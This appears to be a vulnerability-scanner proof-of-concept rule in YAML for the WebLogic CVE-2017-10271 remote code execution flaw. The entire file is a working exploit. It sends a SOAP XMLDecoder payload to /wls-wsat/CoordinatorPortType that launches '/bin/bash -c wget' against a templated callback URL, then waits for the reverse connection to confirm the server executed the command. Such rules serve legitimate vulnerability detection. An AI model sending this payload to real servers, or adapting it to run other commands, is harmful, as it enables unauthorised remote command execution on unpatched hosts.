name: poc-yaml-weblogic-cve-2017-10271-rce
rules:
  - method: POST
    path: /wls-wsat/CoordinatorPortType
    headers:
      Content-Type: text/xml
    body: >-
      <soapenv:Envelope
      xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
      <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
      <java version="1.4.0" class="java.beans.XMLDecoder">
      <void class="java.lang.ProcessBuilder">
      <array class="java.lang.String" length="3">
      <void index="0">
      <string>/bin/bash</string>
      </void>
      <void index="1">
      <string>-c</string>
      </void>
      <void index="2">
      <string>wget {{reverse_url}}</string>
      </void>
      </array>
      <void method="start"/></void>
      </java>
      </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
      </soapenv:Envelope>
    follow_redirects: true
    expression: waitReverse(5)
